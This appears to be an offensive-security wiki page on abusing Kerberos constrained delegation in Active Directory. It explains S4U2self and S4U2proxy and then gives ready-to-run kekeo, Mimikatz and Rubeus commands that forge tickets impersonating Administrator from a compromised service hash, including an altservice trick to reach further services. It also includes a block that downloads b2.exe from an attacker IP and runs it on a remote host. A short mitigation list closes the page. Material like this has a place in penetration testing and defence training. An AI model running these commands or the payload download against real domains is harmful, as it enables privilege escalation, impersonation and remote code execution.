# Constrained Delegation

## Constrained Delegation

Using this a Domain admin can allow 3rd parties to impersonate a user or computer against a service of a machine.

* **Service for User to self (**_**S4U2self**_**):** If a **service account** has a _userAccountControl_ value containing [TRUSTED\_TO\_AUTH\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) (T2A4D), then it can obtains a TGS for itself (the service) on behalf of any other user.
* **Service for User to Proxy(**_**S4U2proxy**_**):** A **service account** could obtain a TGS on behalf any user to the service set in **msDS-AllowedToDelegateTo.** To do so, it first need a TGS from that user to itself, but it can use S4U2self to obtain that TGS before requesting the other one.

**Note**: If a user is marked as ‘_Account is sensitive and cannot be delegated_ ’ in AD, you will **not be able to impersonate** them.

This means that if you **compromise the hash of the service** you can **impersonate users** and obtain **access** on their behalf to the **service configured** (possible **privesc**).\
Also, you **won't only have access to the service that user is able to impersonate, but also to any service that uses the same account as the allowed one** (because the SPN is not being checked, only privileges). For example, if you have access to **CIFS service** you can also have access to **HOST service**.\
Moreover, notice that if you have access to **LDAP service on DC**, you will have enough privileges to exploit a **DCSync**.

{% code title="Enumerate from Powerview" %}
```bash
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```
{% endcode %}

{% code title="Using kekeo.exe + Mimikatz.exe" %}
```bash
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL
#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'  
```
{% endcode %}

{% code title="Using Rubeus " %}
```bash
#Obtain a TGT for the Constained allowed user
.\Rubeus.exe asktgt /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
#Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator
#Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS
#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST
#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp
```
{% endcode %}

{% code title="Other Method (Rubeus)" %}
```
Rubeus.exe tgtdeleg 
.\Rubeus.exe s4u
/ticket:doIE9jCCBPKgAwIBBaEDAgEWooIEBTCCBAFhggP9MIID+aADAgEFoQsbCU0zQy5MT0NBT
KIeMBygAwIBAqEVMBMbBmtyYnRndBsJTTNDLkxPQ0FMo4IDwzCCA7+gAwIBEqEDAgECooIDsQSCA6
3MkP00gTXk3eKQPGJKfoYjY3I3Bg0T6zCZVoQOLPIWI0qR7oMkgRcV1bQ6iyTdAfbbWeuR/IK7osn
RC4EckM+t7QvA4Qnr0t6EJtFNEexa2NG5F9sOv5tlDVSRmFec2+zvw5CDv+sO9dgnOFCPv9rxW40F
Dyz41ccdLuHiRIUT5IgBfT8FR+KF87vc+fFwVDlbqETlzmXUH0or334+YUMdjJDahw/UZAgZh9/U/
hGpqsHdhujNsgJR+MCARBAuC+1PLtzDrRLFR8/Ay4svRr1KAQN7KVopt2FeMUAtWy2QTHWyMFvl7b
5sR4jk0INj5p97Iy1/c9K8V/H0B56PCcUxib+z2SxYZ0koNgsTRI4VwmLxXG7lNu512/fUrLxpcbP
fnAuGAqZuUAKcZquReDRNp3FaKNSphWoY3nTO2ays4hUq3Skhhn3TybM1yg7l4yzdeS+fbBOJ76O2
RpvaMJk3OjTgbMftyKl3nx8yI4Knlxxj0XixHaS3L2lLGfWeCiRaSnJhRq1A10QA/7IMU+V4MkVLf
3sxz4A1TCESHuO2lWvMud3QACJiQlp+uZc8mzKDSHzq8ZUXfHwUw5GjnsMz+n05o+a5/HiGtTzysX
21IukfnHrGDQd2EHd8XVSfhI5ntxhAny3P8WKcBDy5J3gDLqjGZAQA5TeZril/HKT64uk/S8rmOr5
BSQJGZxXpzMyTs38D1Szi2oGADeSF7mZoN3BS8ebkBgxqxJaOxAnFeGlRjao6je79encUOS/iWmfv
ooGP296u8xB4y6Hki+1MLH7QFN2gVddZ5UTZKsE45qZzixEfOa8qKbejb/dCAgAquNCKpbL/2VGCJ
whPrDVVRDZFNy6DBZ29wZI3GjhcSU/K2JnN8vIe0EpHOaPgHVIF19tGzyioeTZdedjRCC7P6LCEUc
rojWbXJt8bxP3BbJN6Bdp9nwTogKf3OONJhapRn0PfZZQYQdZ0tEd3RNAmqCyWEf5tbUd+wyjwjVE
2cdObubHOJQtcXiMxZF7G9YReg/XzGybX4hkindZyS/9jkff4BiIaMk/e7L66ASIT4EeaIiSwS9tn
fCiJxBb59Arn7WYIH+srTRSCYbssbSiCghUW15km5fo4KnVNO6UIWDxdk0JZ+z5JnkL6TGo0++bLX
dOAyPXDWoPmCbLA3jyFebHN98jzzPZgotC7vFpTv8h5jJ5zNeIxcN7PHr+qMRbBISMxxB6mkHFB1g
8yubytnDET6Wx4LUm3OIzqRaOB3DCB2aADAgEAooHRBIHOfYHLMIHIoIHFMIHCMIG/oCswKaADAgE
SoSIEID46bIOxprG+RsD6AyYyOB2Izk7AINDtf+FOAXDBbdlioQsbCU0zQy5MT0NBTKIUMBKgAwIB
AaELMAkbB3N2Y19zcWyjBwMFAGChAAClERgPMjAyMDA0MjIwOTEwNDFaphEYDzIwMjAwNDIyMTkwM
DAxWqcRGA8yMDIwMDQyOTA5MDAwMVqoCxsJTTNDLkxPQ0FMqR4wHKADAgECoRUwExsGa3JidGd0Gw
lNM0MuTE9DQUw= impersonateuser:Micheal.Crosley /domain:m3c.local /msdsspn:"time/m3webaw" /altservice:http /ptt 
```
{% endcode %}

{% code title="Cobalt" %}
```
$session = new-pssession -computername m3webaw
invoke-command $session {powershell -NoP -NonI -c Invoke-WebRequest -Uri 'http://10.10.14.177:80/b2.exe' -OutFile 'c:\\Windows\\Temp\\b2.exe'}
invoke-command $session {cd 'c:\\Windows\\Temp'; .\b2.exe}G
```
{% endcode %}

### Mitigation

* Disable kerberos delegation where possible
* Limit DA/Admin logins to specific services
* Set "Account is sensitive and cannot be delegated" for privileged accounts.

[**More information in ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
